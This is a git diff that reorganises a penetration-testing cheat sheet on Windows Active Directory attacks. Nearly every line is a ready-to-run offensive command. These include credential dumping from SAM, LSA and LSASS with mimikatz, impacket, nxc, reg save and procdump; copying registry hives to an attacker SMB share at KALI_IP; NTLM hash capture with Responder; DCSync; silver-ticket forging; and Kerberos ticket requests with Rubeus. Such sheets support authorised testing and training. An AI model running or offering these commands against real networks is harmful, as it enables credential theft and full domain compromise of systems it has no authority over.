@@ -291,12 +291,12 @@ Set-DomainObject -Identity TARGETUSER -Set @{serviceprincipalname='testdomain.lo
 # https://medium.com/@mayank_prajapati/all-you-need-to-know-about-kerberoasting-7215de0462c8
 ```
 # *Dump SAM/SYSTEM/LSA/LSASS Hashes (LA)*
-## impacket  / nxc
+## impacket-secretsdump / impacket-reg
 ```shell
-# secretsdump (Remote dump)
+# A secretsdump (Remote dump)
 impacket-secretsdump `dom`/'AdminUser'[:'pass']@`tip` -hashes :HASH [ -k ccachefile -no-pass ]
 
-# reg.py (Local dump in Kali)
+# B reg.py (Local dump in Kali)
 # 1 Start smb server
 impacket-smbserver smb . -smb2support [ -username user -password pass ]
 
@@ -309,53 +309,69 @@ impacket-reg `dom`/'AdminUser'[:'pass']@`tip` backup -o '\\KALI_IP\smb'
 
 # 3
 impcaket-secretsdump -sam 'sam' -security 'security' -system 'system' LOCAL
-
-# NXC
+```
+## nxc
+```shell
 nxc smb `tip` -u 'AdminUser' -p 'pass' --sam [ --lsa | --ntds ]
 ```
-## mimikatz / reg
+## mimikatz
 ```shell
-# Mimikatz
+# 1
 privilege::debug
 token::elevate
 
-# Use this if above doesn't fully give results
-sekurlsa::logonpasswords # use this if above doesn't fully give results
-!+ # if logonpasswords returns an error, do this and the below
+# 2 Use this if above doesn't fully give results
+sekurlsa::logonpasswords
+# if logonpasswords returns an error, do this and the below
+!+ 
 !processprotect /process:lsass.exe /remove
-# then try sekurlsa::logonpasswords again
+# Now try sekurlsa::logonpasswords again
 
-# SAM (LOCAL) / LSA (DOMAIN) / LSASS (Users logged on since last reboot)
+#
+# SAM (LOCAL)
 lsadump::sam /patch
-lsadump::lsa /patch OR lsadump::lsa /inject
+
+#
+# LSA (DOMAIN)
+lsadump::lsa /patch
+lsadump::lsa /inject
+
+#
+# LSASS (Users logged on since last reboot)
 sekurlsa::msv
 
+#
 # Windows Cred Manager hashes
 sekurlsa::credman # Windows Cred Manager hashes
-
-
-# Reg
+```
+## reg command
+```shell
 # 1 Save the files
 reg save HKLM\SAM "C:\Windows\Temp\sam.save"
 reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
 # reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
+
 
 # 2 Transfer to Kali and dump
 impacket-secretsdump -sam sam.save -system system.save [ -security security.save ] local
 
 
 # Others
+# A 
 procdump -accepteula -ma lsass.exe lsass.dmp
 
+# B
 Task Manager → Right click lsass.exe → Create dump file
+
+# C
 Control Panel → User Accounts → Credential Manager
 ```
 ## NTLM Capture via UNC
 ```shell
 # 1 Use Responder OR impacket-smbserver
 sudo responder -I tap0
-
 impacket-smbserver smb . -smb2support
+
 
 #  2 Force auth
 dir \\KALI_IP\path\to\test
@@ -372,7 +388,6 @@ impacket-secretsdump -just-dc `dom`/AdminUser[:pass]@`dc` -hashes :HASH
 ```
 ## mimikatz
 ```shell
-# Mimikatz
 privilege::debug
 token::elevate
 
@@ -393,9 +408,11 @@ lsadump::dcsync /domain:[domain] /all /csv
 ```shell
 # 1 Obtain SPN NTLM hash (secretsdump or mimikatz)
 
+
 # 2 GET Domain SID (from one of below)
 impacket-lookupsid `dom`/'user'[:'pass']@`tip` -H :HASH
 nxc ldap `dc` -u 'pass' -p 'pass' -k --get-sid
+
 
 # 3 FORGE the TGS
 impacket-ticketer -domain `dom` -nthash :SPNHASH -domain-sid SID -spn SERVICE/`dom` USER
@@ -456,6 +473,7 @@ token::elevate
 rpc::server
 > BindString[0]: ncacn_ip_tcp:DC[61057]
 
+
 # 2 Can run mimikatz shell now
 impacket-mimikatz -dc-ip `dc` `dom`/'user':['pass']@`tip` -H :HASH
 
@@ -471,15 +489,15 @@ impacket-mimikatz "privilege::debug; token::elevate; sekurlsa::tickets"
 impacket-getTGT -dc-ip `dc` domain/user:password
 export KRB5CCNAME=[ticket].ccache
 ```
-### mimikatz / rubeus
+### mimikatz
 ```shell
 privilege::debug
 token::elevate
 
 tgt::ask /domain: /user: /password:
-
-
-# b) Rubeus
+```
+### rubeus
+```shell
 .\Rubeus.exe asktgt /domain: /user: /password:
 # Options
 # /enctype:[rc4|aes128|aes256|3des]
@@ -495,16 +513,16 @@ impacket-getST -dc-ip `dc` [domain]/[user]:[password] -spn [service]/[host]
 # -impersonate [user]
 # Note: Automatically modifies impersonate TGS so it can be used with other impacket tools.
 ```
-### mimikatz / rubeus
+### mimikatz
 ```shell
 privilege::debug
 token::elevate
 
 kerberos::ask /target:[SPN]/[FQDN]
 # /export to export
-
-
-# b) Rubeus
+```
+### rubeus
+```shell
 .\Rubeus.exe asktgs /service:[SPN]/[FQDN]
 # Options
 # /enctype:
